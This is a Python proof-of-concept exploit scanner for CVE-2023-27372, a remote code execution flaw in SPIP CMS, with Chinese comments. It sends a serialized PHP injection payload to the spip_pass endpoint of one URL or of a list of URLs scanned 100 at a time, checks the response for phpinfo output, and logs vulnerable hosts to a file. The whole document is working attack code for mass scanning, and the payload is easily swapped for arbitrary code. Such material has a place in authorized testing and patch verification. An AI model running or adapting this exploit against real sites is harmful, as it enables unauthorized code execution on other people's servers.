#CVE-2023-27372 SPIP CMS远程代码执行漏洞

import requests,sys,argparse,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
     test="""    _____   _____   ___ __ ___ ____   ___ ____ ________ ___ 
  / __\ \ / / __|_|_  )  \_  )__ /__|_  )__  |__ /__  |_  )
 | (__ \ V /| _|___/ / () / / |_ \___/ /  / / |_ \ / / / / 
  \___| \_/ |___| /___\__/___|___/  /___|/_/ |___//_/ /___|
                                                           

"""
     print(test)

def main():
    banner()
    parsers=argparse.ArgumentParser(description='CVE-2023-27372 SPIP CMS远程代码执行漏洞')
    parsers.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parsers.add_argument('-f','--file',dest='file',type=str,help='please input your filepath')
    args=parsers.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        #mp.map(poc, url_list) 的作用是并行地对 url_list 中的每个 URL 执行 poc 函数（或方法）
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    
    payload="/spip/spip.php?page=spip_pass"

    headers={
       'User-Agent':'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        'Accept-Encoding':'gzip, deflate',
        'Accept':'*/*',
        'Connection':'close',
        'Cookie':'cibcInit=oui',
        'Content-Length':'15',
        'Content-Type':'application/x-www-form-urlencoded',
    }
    data='page=spip_pass&formulaire_action=oubli&formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&oubli=s:19:"<?php phpinfo(); ?>";&nobot='

    try:
        res1=requests.post(url=target+payload,headers=headers,verify=False,data=data)

        if 'PHP Extension' in res1.text and 'PHP Version' in res1.text:
                    print(f"[+]目标存在 {target}")
                    with open('result.txt','a') as f:
                        f.write(target+'\n')
        else:
             print(f'[-]目标不存在漏洞 {target}')
    except:
        pass


if __name__ == '__main__':
    main()


